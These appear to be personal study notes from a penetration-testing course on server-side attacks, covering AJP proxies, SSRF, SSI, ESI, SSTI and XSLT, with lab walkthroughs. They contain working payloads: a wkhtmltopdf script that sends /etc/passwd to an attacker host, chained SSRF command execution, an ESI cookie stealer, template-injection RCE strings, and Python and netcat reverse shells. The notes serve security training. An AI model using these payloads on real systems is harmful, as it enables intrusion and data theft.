# Server Side Attacks

## Introduction to Server Side Attacks

server side attacks target the app or service provided by a server, whereas a client-side attack attacks the client  

CSRF attacks use other client-side attacks like XSS to perform requests to a web app that a victim is already authenticated to   
therefore, the client is the target   

server-side attacks target the actual application with the objective being to leak sensitive data or inject unwanted input to possibly achieve RCE   
targets in this situation are the back-end services 

### Types of server-side attacks 

- `abusing intermediary applications` - accessing internal apps not accessible from our network by leveraging specific exposed binary protocols 
- `server side request forgery SSRF` - making host app server issue requests to arbitrary external domains or internal resources to attempt to id sensitive data 
- `server-side includes injection SSI` - injecting payload so that ill-intended server-side include directives are parsed to get RCE or leak sensitive data. Occurs when poorly validated user input becomes part of a response that is parsed for server-side include directives 
- `edge-side includes injection ESI` - ESI is an XML-based markup languages used to tackle performance issues by temp storing dynamic web content that normal web caching doesn't save. Occurs when attacker reflects ill-intended ESI tags in the HTTP response. Root cause is that HTTP surrogates can't validate the ESI tag origin so they will execute all of them regardless if they are malicious 
- `server-side template injection SSTI` - template engines facilitate dynamic data presentation through web pages or emails. SSTI injects malicious template directives inside a template which leverages template engines that mix user input with a given template 
- `extensible stylesheet language transformations server-side injections XSLT` - XSLT is an XML-based languages usually used when converting XML to HTML, another XML, or PDF. XSLT can occur when arbitrary XSLT file upload is possible or when the app generates XSL transformation's XML document dynamically using unvalidated input

## AJP Proxy 

AJP or JK is a wire protocol   
optimized version of the HTTP protocol to allow a standalone web server like Apache to talk to Tomcat   
usually apache is much faster than tomcat at serving static content to it tries to server static content when possible then proxy the request to tomcat for tomcat related content 

AJP proxy ports = 8009 TCP; may be able to use them to access hidden apache tomcat manager behind them   
AJP proxy is a binary protocol but we can make our own Nginx or apache web server with AJP modules to interact with it   
can discover admin panels, apps, and sites that otherwise would be inaccessible 

if you want to generate your own vulnerable environment you can start an apache tomcat docker exposing only the AJP proxy: 

first create file `tomcat-users.xml`

```xml
<tomcat-users>
  <role rolename="manager-gui"/>
  <role rolename="manager-script"/>
  <user username="tomcat" password="s3cret" roles="manager-gui,manager-script"/>
</tomcat-users>
```

then install the docker package in your local machine and start the apache tomcat server: 

```shell 
sudo apt install docker.io
sudo docker run -it --rm -p 8009:8009 -v `pwd`/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml --name tomcat "tomcat:8.0"
```

## Nginx Reverse Proxy & AJP 

when we find an open AJP proxy port 8009 we can use nginx with an `ajp_module` to access the hidden tomcat manager   

we can compile the nginx source code and add the required module by doing: 
- download the nginx source 
- download the required module 
- compile nginx source code with `ajp_module` 
- create config file pointing to AJP port 

download the nginx source code: 

```shell
wget https://nginx.org/download/nginx-1.21.3.tar.gz
tar -xzvf nginx-1.21.3.tar.gz
```

compile the nginx source code with the ajp module: 

```shell
git clone https://github.com/dvershinin/nginx_ajp_module.git
cd nginx-1.21.3
sudo apt install libpcre3-dev
./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
make
sudo make install
nginx -V
```

note that the following will setup on port 8009 which is what we normally will use but for the exercise purposes we will need to use the spawned target's IP and port 

comment out the entire `server` block and append the following lines to the `http` block in `/etc/nginx/conf/nginx.conf`: 

```
upstream tomcats {
	server <TARGET_SERVER>:8009;
	keepalive 10;
	}
server {
	listen 80;
	location / {
		ajp_keep_conn on;
		ajp_pass tomcats;
	}
}
```

![](Images/Pasted%20image%2020240212115855.png)

![](Images/Pasted%20image%2020240212120927.png)

![](Images/Pasted%20image%2020240212120355.png)

note that in the above we also changed `listen 80` to 8080

start nginx and check if everything is working correctly with a curl request to your local host: 

![](Images/Pasted%20image%2020240212120856.png)

## Apache Reverse Proxy and AJP 

connecting to AJP with apache is much simpler because the AJP module is precompiled for us but we will still need to install it 

we can configure the AJP-proxy in our apache server as follows: 
- install the `libapache2-mod-jk` package
- enable the module 
- create the config file pointing to the AJP-proxy port 

again, apache will default use port 80 but we can change this in `/etc/apache2/ports.conf`   
if we are doing this on port 8080 remember that we just ran nginx on there so we would also need to do `sudo nginx -s stop`  
and again in the following exercise we would normally use port 8009 but will instead use the spawned target's IP and port 

listen on 8080: 

![](Images/Pasted%20image%2020240212122526.png)

setup the required commands and config files: 

```shell
sudo apt install libapache2-mod-jk
sudo a2enmod proxy_ajp
sudo a2enmod proxy_http
export TARGET="<TARGET_IP>"
echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:8009/
ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
sudo systemctl start apache2
```

for the example it would be: 

```shell
sudo apt install libapache2-mod-jk
sudo a2enmod proxy_ajp
sudo a2enmod proxy_http
export TARGET="83.136.253.251"
echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:41513/
ProxyPassReverse / ajp://$TARGET:41513/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
sudo systemctl start apache2
```

then curl to localhost (with alternative port if necessary): 

![](Images/Pasted%20image%2020240212122656.png)

note that with this configuration we will also be able to view this in our web browser: 

![](Images/Pasted%20image%2020240212122807.png)

## Server-Side Request Forgery (SSRF) Overview 

SSRF attacks let us abuse server functionality to perform internal or external resource requests on behalf of the server   
to do this we usually need to supply or modify urls used by the target app to read or submit data 

exploiting SSRF can lead to: 
- interacting with known internal systems 
- discovering internal services with port scans 
- disclosing local/sensitive data 
- including files in the target app 
- leaking NetNTLM hashes using UNC paths (windows)
- achieving RCE 

we can usually find SSRF in apps that fetch remote resources  
when looking for SSRF we should look for: 
- parts of HTTP requests, including URLs 
- file imports such as HTML, PDFs, images, etc. 
- remote server connections to fetch data 
- API specification imports 
- dashboards including ping and similar functionalities to check server statuses 

fuzzing can be extended to parts of the HTTP-request like the `User-Agent` to help find SSRF 

## SSRF Exploitation Example 

with our target we can work to exploit multiple SSRF vulnerabilities to gain RCE on an internal host with the following attack chain: 

pentester -> exercise-target SSRF -> internal webserver SSRF -> localhost webapp -> RCE 

basic recon on our target shows 3 open ports: 

![](Images/Pasted%20image%2020240212145435.png)

now lets do a silent curl request to get the protocol response headers 

`curl -i -s http://target`

![](Images/Pasted%20image%2020240212145536.png)

from this we can see that the request redirected to `/load?q=index.html` meaning that the `q` parameter fetches the resource `index.html` 

now lets try to follow the redirect with `-L`: 

![](Images/Pasted%20image%2020240212145716.png)

now we can see `ubuntu-web.lalaguna.local` and `internet.app.local` which are apps on the internal network (inaccessible from our current position)

now we want to see if the `q` parameter is open to SSRF, and if it is we may be able to reach the `internal.app.local` web app   
"may" because a trust relationship between `ubuntu-web` and `internal.app.local` likely exists   
this type of relationship can be something like a firewall rule or lack of a firewall rule

lets start by listening on port 8080: 

![](Images/Pasted%20image%2020240212155955.png)

then we can issue a request to the target web app with `http://<VPN/TUN adapter IP>` instead of `index.html` in the `q` parameter 

![](Images/Pasted%20image%2020240212160347.png)

we can see the response of a request issued by the target server using python-urllib on our netcat listener: 

![](Images/Pasted%20image%2020240212160335.png)

`python-urllib` supports `file`, `http`, and `ftp` schemas, so we can read local files via the `file` schema and remote files using `ftp` 

we can test the functionality by completing a few steps 

first we create a file called `index.html` 

```html
<html>
</body>
<a>SSRF</a>
<body>
<html>
```

then in the same directory we start an HTTP server using `python3 -m http.server 9090`: 

![](Images/Pasted%20image%2020240212160847.png)

then again in the same directory start an FTP server with: 

```shell
sudo pip3 install twisted
sudo python3 -m twisted ftp -p 21 -r .
```

![](Images/Pasted%20image%2020240212161124.png)

retrieve `index.html` through FTP:

`curl -i -s "http://<target>/load?q=ftp://<VPN/TUN adapter IP>/index.html`

![](Images/Pasted%20image%2020240212161734.png)

you can also retrieve `index.html` through the target app using http: 

`curl -i -s "http://<target>/load?q=http://10.10.15.54:9090/index.html`

![](Images/Pasted%20image%2020240212161228.png)

then you can retrieve local files through the target app with the file schema: 

![](Images/Pasted%20image%2020240212161329.png)

fetching these remote HTML files can lead to reflected XSS 

we've only seen two open ports on the target server but there is a possibility of internal apps existing and listening only on localhost   

we can use ffuf to fuzz for internal apps

first we can generate a wordlist containing all possible ports with: 

`for port in {1..65535}; do echo $port >> ports.txt;done`

issue a request to a random port to get the response size of a request for a false or non-existent service: 

`curl -i -s "http://<target>/load?q=http://127.0.0.1:1` 

![](Images/Pasted%20image%2020240212171333.png)

use ffuf with the wordlist and filter the responses by size: 

![](Images/Pasted%20image%2020240212171524.png)

we can see that port 5000 is another listening app: 

![](Images/Pasted%20image%2020240212172234.png)

we can now send a request to the port: 

![](Images/Pasted%20image%2020240212172820.png)

now to hopefully achieve RCE we can start by issuing a curl request to the internal app that we discovered previously: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=index.html"`

![](Images/Pasted%20image%2020240212173201.png)

we can again find any web apps listening on the localhost, lets first issue a request to a random port to see how closed port responses look: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"`

![](Images/Pasted%20image%2020240212173450.png)

we got `unknown url type` which means that the web app appears to be removing `://` from our request which we can get around by manipulating the url: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"`

![](Images/Pasted%20image%2020240212173641.png)

now we get a connection response but it includes content based on the resource we are trying to fetch, so if we used this size of the response it wouldn't filter much out  
instead we can use regex for filtering: 

`ffuf -w ./ports.txt:PORT -u "http://<target>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'`

![](Images/Pasted%20image%2020240212174152.png)

again we have found an application listening on port 5000

we can use the same tactics of sending a request to the 3rd app: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/`

![](Images/Pasted%20image%2020240212174426.png)

we have now successfully accomplished: 
- issue requests on behalf of ubuntu-web to internal.app.local
- reach a web app listening on port 5000 inside of internal.app.local, chaining two SSRF vulnerabilities 
- disclose a list of files via the internal app 

now we can use the files to uncover source code to see how we might achieve RCE 

lets issue a request to disclose `/proc/self/environ` where the current path should be present under the `PWD` env variable: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -`

![](Images/Pasted%20image%2020240212174819.png)

we can see from the response that `PWD=/app` and there is a list of interesting files, lets look at `internal_local.py`: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"`

![](Images/Pasted%20image%2020240212180129.png)

looking at the code we can see functionality that lets us execute commands on the remote host by sending a GET request to `/runme?x=<cmd>`

lets try with: 

`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"`

![](Images/Pasted%20image%2020240212180510.png)

from this we can see that we are the root user and we can execute commands, but what if we submit a command with arguments like: 

`runme?x=uname -a`

![](Images/Pasted%20image%2020240212180702.png)

because we are going through 3 applications, we will need to encode our special characters 3 times, like we did with the `http::////` 

can install jq to help encode: 

```shell
sudo apt-get install jq
echo "encode me" | jq -sRr @uri
```

then we can make a bash function to automate executing commands on the target app: 

```bash
function rce() {
function> while true; do
function while> echo -n "# "; read cmd
function while> ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
function while> curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
function while> echo ""
function while> done
function> }
```

then use `rce` to run or use encoder to find flag

![](Images/Pasted%20image%2020240212192951.png)

## Blind SSRF 

in blind SSRF even though the request is processed we can't see the backend server's response 

we can detect these via out-of-band techniques which make the server issue a request to an external service under our control   
can detect if a backend service is processing our requests with either a server using a public IP that we own or services like: 
- burp collaborator (pro) 
- pingb.in

blind ssrf can exist in pdf document generators and HTTP headers among other locations 

## Blind SSRF Exploitation Example

our target receives an html file and returns a PDF document: 

![](Images/Pasted%20image%2020240212201436.png)

when uploading a file we get the same response from the server every time, and there isn't any observed response on the frontend either: 

![](Images/Pasted%20image%2020240212201532.png)

in order to test for blind SSRF we can first create an HTML file containing a link to a service under our control 

```html
<!DOCTYPE html>
<html>
<body>
	<a>Hello World!</a>
	<img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
</body>
</html>
```

the service can be a web server we are hosting, burp collaborator, pingb.in url, etc.   
the protocols we can use when using out-of-band techniques include HTTP, DNS, FTP, etc. 

we can start with a netcat listener on port 9090: 

![](Images/Pasted%20image%2020240212201959.png)

when we use the app to submit our html with our service inside of it we get our response: 

![](Images/Pasted%20image%2020240212202128.png)

from the response we can see the User-Agent is `wkhtmltopdf`  
without sanitation this is a very vulnerable application to javascript code  
we can execute JS in `wkhtmltopdf` with the following file: 

```html
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>
```

in this code we are using two `XMLHttpRequest` objects, one to read the local file and the other to send it to our server   
we also use `btoa` function to send the data encoded in base64

now with our listener we can submit the JS payload and get the response: 

![](Images/Pasted%20image%2020240212202701.png)

then we can decode the base64 data: 

![](Images/Pasted%20image%2020240212202757.png)

this target also has the same `internal.app.local` application like the previous exercise   
let us now compromise the underlying server with an HTML document with a payload that will exploit the local app listening on `internal.app.local`

we could see last time that the server was using python so lets create a bash reverse shell that uses python to gain RCE: 

![](Images/Pasted%20image%2020240212203110.png)

remember that in this case we will need to URL encode this multiple times to go through the multiple apps 

lets put this in an HTML file that performs a GET request to `internal.app.local` then uses its local app vulnerable to RCE via SSRF and executes our reverse shell (the `x` parameter from the previous exercise): 

```html
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=<urlencodedpayload>", true); 
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>
```

we then can get RCE in our listener 

![](Images/Pasted%20image%2020240212204148.png)

## Time-Based SSRF 

we can also determine the existence of an SSRF vulnerability by observing the time differences between responses  
this is also useful discovering internal services 

if we submit this html doc to the app: 

```html
<html>
    <body>
        <b>Time-Based Blind SSRF</b>
        <img src="http://blah.nonexistent.com">
    </body>
</html>
```

we can see that it took a certain amount of time to respond: 

![](Images/Pasted%20image%2020240212210134.png)

if we submit a valid URL inside the HTML doc then it will take less time to respond  
`internal.app.local` was a valid internal app that we could access through SSRF 

![](Images/Pasted%20image%2020240212210240.png)

in some cases the app may fail immediately instead of taking more time to respond so we still need to observe the time differences between requests carefully 

## Server-Side Includes Overview 

server-side includes (SSI) is a tech used by web apps to create dynamic content on HTML pages before loading or during the rendering process by evaluating SSI directives 

some SSI directives: 

```html
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->
```

you can identify the use of SSI on a web app by checking for extensions like `.shtml`, `.shtm`, or `.stm`  
non-default server configs exist that allow other extensions like `html` to process SSI directives 

need to send our payloads through input fields to test for SSI injection   
web server will parse and execute directives before rendering the page if a vulnerability is present   
vulnerabilities can be blind as well 

successful SSI injection can lead to extracting sensitive info from local files or executing commands on the target server 

## SSI Injection Exploitation Example 

our target is a basic form submission:

![](Images/Pasted%20image%2020240213115037.png)

lets try some of the payloads we know: 

```html
<!--#echo var="DATE_LOCAL" -->
<!--#printenv -->
```

![](Images/Pasted%20image%2020240213115230.png)

![](Images/Pasted%20image%2020240213115259.png)

now that we have confirmed that the site is vulnerable to SSI injections we can try some other payloads to see if we can get full command injection 

remember that we can use reverse shells like: 

![](Images/Pasted%20image%2020240213115907.png)

the above will work even against OpenBSD-netcat that doesn't include the execute functionality by default   

the shell uses: 
- `mkfifo /tmp/foo` - create a FIFO special file in `/tmp/foo`
- `nc <IP> <PORT> 0</tmp/foo` - connect the pentest machine and redirect the standard input descriptor 
- `| bin/bash 1>/tmp/foo` - execute `/bin/bash` redirecting the standard output descriptor to `/tmp/foo` 
- `rm /tmp/foo` - cleanup the FIFO file 

## Edge-Side Includes (ESI) Injection

edge-side includes ESI is an XML-based markup language used to tackle performance issues by enabling heavy caching of web content that would otherwise be unstorable through traditional caching protocols 

ESI allow for dynamic web content assembly at the edge of the network (CDN, user's browser, or reverse proxy) by instructing the page processor what needs to be done to complete page assembly through ESI element tags (xml) 

ESI tags instruct an HTTP surrogate (reverse-proxy, caching server, etc.) to fetch additional info regarding a page with an already cached template    
this info can come from another server before rending the page   
ESI enable fully cached web pages to include dynamic content 

ESI injection occurs when an attacker manages to reflect malicious ESI tags in the HTTP response   
root cause is HTTP surrogates cannot validate the ESI tag origin so all tags are executed the same   

we can identify the use of ESI by inspecting response headers for `Surrogate-Control: content="ESI/1.0"`   
however, we usually need to use a blind attack to detect ESI; we can use ESI tags in HTTP requests to see if any proxy is parsing the request and if ESI injection is possible 

some useful tags are: 

```html
// Basic detection
<esi: include src=http://<PENTESTER IP>>

// XSS Exploitation Example
<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>

// Cookie Stealer (bypass httpOnly flag)
<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```

in some cases we can get RCE when the app processing ESI directives supports XSLT, a dynamic language used to transform XML files  
in this case we can pass `dca=xslt` to the payload and the xml file will be processed with the possibility of performing XML external entity injection attacks XXE

`GoSecure` has a table for possible attacks that we can try against ESI-capable software 

![](Images/Pasted%20image%2020240213140037.png)

the columns are: 
- Includes = supports the `<esi:includes>` directive 
- Vars = supports the `<esi:vars>` directive, useful for bypassing XSS filters
- Cookie = document cookies are accessible to the ESI engine
- Upstream Headers Required = surrogate applications will not process ESI statements unless the upstream app provides the headers 
- Host Allowlist = ESI includes are only possible from allowed server hosts, making something like SSRF only possible against those hosts 

## Introduction to Template Engines

template engines read tokenized strings from template docs and produce rendered strings with actual values in the output doc   
commonly used as intermediary format to create dynamic website content   

server-side template injection SSTI is injecting malicious template directives inside a template 

if we have the following files: 

```python
#/usr/bin/python3
from flask import *

app = Flask(__name__, template_folder="./")

@app.route("/")
def index():
	title = "Index Page"
	content = "Some content"
	return render_template("index.html", title=title, content=content)

if __name__ == "__main__":
	app.run(host="127.0.0.1", port=5000)
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>{{title}}</h1>
    <p>{{content}}</p>
</body>
</html>
```

when we visit the site we will see the page with actual values for `title` and `content` 

what if the template includes user input: 

```python
#/usr/bin/python3
from flask import *

app = Flask(__name__, template_folder="./")

@app.route("/")
def index():
	title = "Index Page"
	content = "Some content"
	return render_template("index.html", title=title, content=content)

@app.route("/hello", methods=['GET'])
def hello():
	name = request.args.get("name")
	if name == None:
		return redirect(f'{url_for("hello")}?name=guest')
	htmldoc = f"""
	<html>
	<body>
	<h1>Hello</h1>
	<a>Nice to see you {name}</a>
	</body>
	</html>
	"""
	return render_template_string(htmldoc)

if __name__ == "__main__":
	app.run(host="127.0.0.1", port=5000)
```

in this case we can inject a template expression directly and the server will evaluate it, this could lead to RCE: 

`curl -gis 'http://127.0.0.1:5000/hello?name={{7*7}}`

## SSTI Identification 

can detect SSTI by injecting tags in inputs to see if they are evaluated   
don't necessarily need to see the reflected response, sometimes it is blind and evaluated on different pages 

easiest way to detect injections is to supply math expressions in curly brackets: 

```html
{7*7}
${7*7}
#{7*7}
%{7*7}
{{7*7}}
```

the most difficult way is to inject combos of special characters used in template expressions: 

`${{<%[%'"}}%\`

if an exception is caused then we have some control over what the server interprets 

we can use tools like `tplmap` or `J2EE Scan` (burp pro) to auto test for SSTI or create a payload list to use with burp intruder 

this diagram can help us identify if we are dealing with SSTI and also identify the underlying template engine: 

![](Images/Pasted%20image%2020240213203902.png)

can also try these to recognized the technology we are dealing with: 
- check verbose errors for technology names. Sometimes just copying the error in google can give us answer
- check for extensions. For example, .jsp for java 
- send expressions with unclosed curly brackets to see if verbose errors generated. Do not try on prod systems as it may crash the server 

## SSTI Exploitation Example 1

our target is a simple form: 

![](Images/Pasted%20image%2020240214102937.png)

lets try using basic math expressions to test for SSTI: 

`{{7*7}}`

![](Images/Pasted%20image%2020240214103157.png)

now we need to identify what sort of template engine the app is using   
now that we know `{{7*7}}` works, the next step in the portswigger diagram suggests trying `{{7*'7'}}`: 

![](Images/Pasted%20image%2020240214103442.png)

this was also successfully evaluated so according to the diagram the app is using either Jinja2 or Twig 

so now lets try a Twig-specific payload: 

`{{_self.env.display("TEST")}}`

![](Images/Pasted%20image%2020240214103639.png)

for more specific template engine payloads look at: 
- payloadallthethings template injection 
- hacktricks - SSTI 

could also automate the engine identification with `tplmap`   
in this example the user input is submitted through the `name` parameter and through a POST request: 

```shell
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install virtualenv
virtualenv -p python2 venv
source venv/bin/activate
pip install -r requirements.txt
./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john
```

the next step is to gain RCE   
the Twig variable `_self` makes a few of the internal APIs public   
we can use `getFilter` to execute a user-defined function via: 
- register a function as a filter callback via `registerUndefinedFilterCallback`
- invoke `_self.env.getFilter()` to execute the function we have just registered 

so now our payload becomes: 

```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
```

and we inject this into a curl command to the target: 

`curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<target>:<port>`

![](Images/Pasted%20image%2020240214104829.png)
![](Images/Pasted%20image%2020240214104901.png)

we could have also automated this with tplmap: 

`./tplmap.py -u 'http://<target>:<port>' -d name=john --os-shell`

![](Images/Pasted%20image%2020240214105227.png)

one thing to note is that if we successfully evaluate the math expressions, then the app may also be vulnerable to XSS 

## SSTI Exploitation Example 2 

our new target is also a form: 

![](Images/Pasted%20image%2020240214111302.png)

we can see that the data is sent through a POST request to `/jointheteam` in the `email` parameter: 

![](Images/Pasted%20image%2020240214111407.png)

using the payload `{{7*7}}` we can again get successful evaluation: 

![](Images/Pasted%20image%2020240214111521.png)

then we try `{{7*'7'}}` and it also works: 

![](Images/Pasted%20image%2020240214111610.png)

however, if we try any specific payload for either twig or jinja2 we get an internal server error: 

![](Images/Pasted%20image%2020240214111744.png)

at this point we now have to fuzz with different types of payloads to discover what template engine we are working with   
again we can automate this with tplmap and find that it is using tornado: 

![](Images/Pasted%20image%2020240214112021.png)

we can also use payloads like: 

`curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam`

## SSTI Exploitation Example 3 

this time the user input is submitted in the `cmd` parameter in a GET request: 

![](Images/Pasted%20image%2020240214113124.png)

the `{{7*7}}` payload will be evaluated: 

![](Images/Pasted%20image%2020240214113228.png)

with `{{7*'7'}}` we again get results: 

![](Images/Pasted%20image%2020240214113314.png)

we can tell from this output that the engine is jinja2, but we could have also automated to find this: 

![](Images/Pasted%20image%2020240214113523.png)

### Python primer for SSTI 

fatalerrors.org has a dictionary to refer to for jinja2 payload development: 

![](Images/Pasted%20image%2020240214113627.png)

in python we can look at some of these with a string variable: 

![](Images/Pasted%20image%2020240214113849.png)

we looked at the variable's `type()`, `.__class__`, and then used `dir()` to look at all the methods and attributes it has 

then using `__mro__` or `mro()` we can go up the tree of inherited objects in the python env

![](Images/Pasted%20image%2020240214114400.png)
![](Images/Pasted%20image%2020240214114327.png)

now we can look for useful classes that can facilitate RCE: 

![](Images/Pasted%20image%2020240214114823.png)

![](Images/Pasted%20image%2020240214115034.png)

we search for `warning` because this class imports python's `sys` module and from it we can reach the `os` module   
also os modules are all from `warnings.catch_`

now lets enumerate the builtins from this class: 

![](Images/Pasted%20image%2020240214115402.png)

![](Images/Pasted%20image%2020240214115411.png)

we have found the import function by walking the hierarchy, this means that we can load `os` and use the `system` function to execute code from a string object: 

`''.__class__.__mro__[1].__subclasses__()`

![](Images/Pasted%20image%2020240214115948.png)

now in our web browser we can use the payload: 

`{{ ''.__class__ }}`

```shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"
```

![](Images/Pasted%20image%2020240214180344.png)

we can see that we want the second item in this list so now we can modify our payload to be: 

`{{ ''.__class__.__mro__[1] }}`

`curl -gs "http://94.237.58.211:41086/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D%20%7D%7D"`

![](Images/Pasted%20image%2020240214180605.png)

then we can start walking the hierarchy with: 

`{{ ''.__class__.__mro__[1].__subclasses__() }}`

![](Images/Pasted%20image%2020240214180737.png)

then we can print out the number and the method names using a new payload: 

```python
{% for i in range(450) %} 
{{ i }}
{{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }} 
{% endfor %}
```

![](Images/Pasted%20image%2020240214180903.png)

in this list we can find `catch_warnings` at index 214

now we have everything we need to construct an RCE payload like: 

```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system("touch /tmp/test1") }}
```

![](Images/Pasted%20image%2020240214181228.png)

the app returned 0 which signals that the command we entered executed without errors 

then we can see if `test1` was actually created with another payload: 

```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()}}
```

![](Images/Pasted%20image%2020240214181424.png)

there are also some specific functions that facilitate the exploitation of jinja2 SSTI vulnerabilities, like `request` and `lipsum`

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

```python
{{lipsum.__globals__.os.popen('id').read()}}
```

we can also create a reverse shell with payloads like: 

```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<PENTESTER_IP>",<PENTESTER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()}}
```

## Attacking XSLT 

extensible stylesheet language transformations XSLT is an xml-based language for transforming xml docs into HTML, another xml doc, or pdf   
XSLT injcections can occur when arbitrary XSLT file generates XSL transformation's XML document dynamically suing unvalidated input from the user

depending on the case, XSLT uses built-in functions and XPATH language to transform a doc either in the browser or server   
XSLT transformations are present in some web apps as standalone functionality, SSI engines, and databases in oracle 

3 XSLT versions: 1 least interesting because no functionality   
most used XSLT-related projects are LibXSLT, Xalan, and Saxon 

to exploit XSLT injections we need to store malicious tags on the server-side and access that content 

first install the required packages: 

```shell
sudo apt install default-jdk libsaxon-java libsaxonb-java
```

then create the following files: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <cd>
    <title>Empire Burlesque</title>
    <artist>Bob Dylan</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>10.90</price>
    <year>1985</year>
  </cd>
  <cd>
    <title>Hide your heart</title>
    <artist>Bonnie Tyler</artist>
    <country>UK</country>
    <company>CBS Records</company>
    <price>9.90</price>
    <year>1988</year>
  </cd>
  <cd>
    <title>Greatest Hits</title>
    <artist>Dolly Parton</artist>
    <country>USA</country>
    <company>RCA</company>
    <price>9.90</price>
    <year>1982</year>
  </cd>
  <cd>
    <title>Still got the blues</title>
    <artist>Gary Moore</artist>
    <country>UK</country>
    <company>Virgin records</company>
    <price>10.20</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Eros</title>
    <artist>Eros Ramazzotti</artist>
    <country>EU</country>
    <company>BMG</company>
    <price>9.90</price>
    <year>1997</year>
  </cd>
  <cd>
    <title>One night only</title>
    <artist>Bee Gees</artist>
    <country>UK</country>
    <company>Polydor</company>
    <price>10.90</price>
    <year>1998</year>
  </cd>
  <cd>
    <title>Sylvias Mother</title>
    <artist>Dr.Hook</artist>
    <country>UK</country>
    <company>CBS</company>
    <price>8.10</price>
    <year>1973</year>
  </cd>
  <cd>
    <title>Maggie May</title>
    <artist>Rod Stewart</artist>
    <country>UK</country>
    <company>Pickwick</company>
    <price>8.50</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Romanza</title>
    <artist>Andrea Bocelli</artist>
    <country>EU</country>
    <company>Polydor</company>
    <price>10.80</price>
    <year>1996</year>
  </cd>
  <cd>
    <title>When a man loves a woman</title>
    <artist>Percy Sledge</artist>
    <country>USA</country>
    <company>Atlantic</company>
    <price>8.70</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Black angel</title>
    <artist>Savage Rose</artist>
    <country>EU</country>
    <company>Mega</company>
    <price>10.90</price>
    <year>1995</year>
  </cd>
  <cd>
    <title>1999 Grammy Nominees</title>
    <artist>Many</artist>
